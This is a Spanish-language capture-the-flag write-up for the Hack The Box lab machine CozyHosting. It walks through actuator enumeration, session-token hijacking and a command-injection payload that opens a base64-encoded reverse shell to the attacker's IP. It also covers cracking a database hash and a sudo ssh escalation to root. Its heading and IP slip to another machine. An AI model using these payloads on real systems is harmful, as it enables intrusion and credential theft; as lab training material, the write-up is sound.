---
layout: post
title:  "Maquina CozyHosting | HTB Write-Up"
description: Empezaremos con el Write-Up de la maquina de HackTheBox llamada CozyHosting.
tags: HTB, Facil, Linux
---

# Timelapse ~ Hack The Box

Machine IP: 10.10.11.152

## Reconocimiento

Empezamos con el escaneo de puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.230 -oG allPorts
```

Nos encontramos con el puerto **22** y **80** abiertos.

Ahora realizamos el escaneo de versiones:

```bash
nmap -sCV -p22,80 10.10.11.230 -oN targeted
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Agregamos la pagina al archivo ```/etc/hosts```:

```
10.10.11.230 cozyhosting.htb 
```

Mientras revisamos el servicio web realizaremos una enumeracion de directorios con Wfuzz:

```bash
wfuzz -c --hc=404 -t 20 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://cozyhosting.htb/FUZZ
```

Encontramos algunos directorios:

```bash
000000015:   200        284 L    745 W      12706 Ch    "index"
000000053:   200        96 L     196 W      4431 Ch     "login"
000000259:   401        0 L      1 W        97 Ch       "admin"     
000001225:   204        0 L      0 W        0 Ch        "logout"                 
000002708:   500        0 L      1 W        73 Ch       "error"
```


En el login nos encontramos con este formulario:

![](https://i.imgur.com/lFA5bvu.png)
Pruebo algunas inyecciones, y editar algunas cosas con el inspector pero no logro nada.

Paso a ver la pagina de error, y me encuentro con algo que me llama la atencion:

![](https://i.imgur.com/WfYskGP.png)

Decido googlear "Whitelabel Error Page", y me encuentro que corresponde a un error de SpringBoot.

Intento algunas inyecciones pero no llego a nada.
Investigando encuentro que SpringBoot tiene sus propios directorios, asi que decide enumerar directorios que correspondan a SpringBoot y encuentro lo siguiente:

```bash
000000051:   200        0 L      1 W        15 Ch       "actuator/health"
000000044:   200        0 L      13 W       487 Ch      "actuator/env/path"
000000038:   200        0 L      120 W      4957 Ch     "actuator/env"
000000041:   200        0 L      13 W       487 Ch      "actuator/env/lang"
000000072:   200        0 L      1 W        445 Ch      "actuator/sessions"
000000029:   200        0 L      1 W        634 Ch      "actuator"
000000039:   200        0 L      13 W       487 Ch      "actuator/env/home"
000000058:   200        0 L      108 W      9938 Ch     "actuator/mappings"
000000032:   200        0 L      542 W      127224 Ch   "actuator/beans"
```

Revisando el directorio ```actuator/sessions``` encuentro esto:

![](https://i.imgur.com/VeNDZQs.png)

Lo que parece ser un usuario con su Token.

Anteriormente habiamos encontrado un directorio de **admin**, asi que intentaremos ingresar una vez hayamos puesto el token:

![](https://i.imgur.com/b3X0G26.png)

Ahora recargamos a la pagina de **admin**

![](https://i.imgur.com/qJDXNfE.png)

**Obtuvimos acceso al panel de admin!**

Revisando la pagina, el apartado que mas llama la atencion es al final de todo

![](https://i.imgur.com/9OLcGhY.png)

Al parecer nos permite configurar una conexion por SSH.

Si ingresamos solamente el Hostname, y dejamos el Username vacio nos dara un error, el cual nos dara un indicio de un Command Injection.

![](https://i.imgur.com/ixn0ixE.png)

Creamos un PAYLOAD que nos permita entablar una [[Reverse Shell]]:
```bash
;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjkvNDQzIDA+JjE="|base64${IFS}-d|bash;
```

> El comando a ejecutar debe estar en Base64.

![](https://i.imgur.com/DEA6RYW.png)

Dentro del usuario **app** no podemos hacer mucho, asi que tendremos que buscar la manera de escalar privilegio.

El archivo mas interesante que encontramos, es en la misma carpeta de **app** llamado ```cloudhosting-0.0.1.jar```

Lo pasamos a nuestra maquina, y extraemos lo que contiene.
Buscando entre las carpetas extraidas encontramos un archivo ```application.properties``` en
```/content/BOOT-INF/classes/``` el cual contiene informacion para conectarse a una base de datos **postresql**

![](https://i.imgur.com/F82RIuT.png)

Una vez conectado a la base de datos con el comando:
```bash
psql "postgresql://$DB_USER:$DB_PWD@$DB_SERVER/$DB_NAME"
```

Comenzamos a enumerar.
![](https://i.imgur.com/wZUqABH.png)
En la base de datos **cozyhosting** encontramos el hash del usuario **Admin**.

![](https://i.imgur.com/YoqyzNK.png)

Utilizando [[Hashcat]] desciframos la password:

```bash
hashcat -m 3200 -a 0 hash.txt /home/pirra/Downloads/rockyou.txt -o cracked.txt
```

Con la password obtenida tendremos acceso al usuario **Josh**

![](https://i.imgur.com/i1sxXnQ.png)

Haciendo un **sudo -l** y proporcionando la password obtenida me doy cuenta de que puedo utilizar SSH como sudo:

![](https://i.imgur.com/jWBt3Y2.png)

Aca ya sabemos lo que debemos hacer.
Directamente vamos [GTFObins](https://gtfobins.github.io/gtfobins/ssh/) y buscamos SSH, y de inmediato encontramos un comando que nos permite acceder a usuario **Root**

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
![](https://i.imgur.com/P4wcmol.png)

Con esto la maquina queda finalizada.

Happy Hacking!!


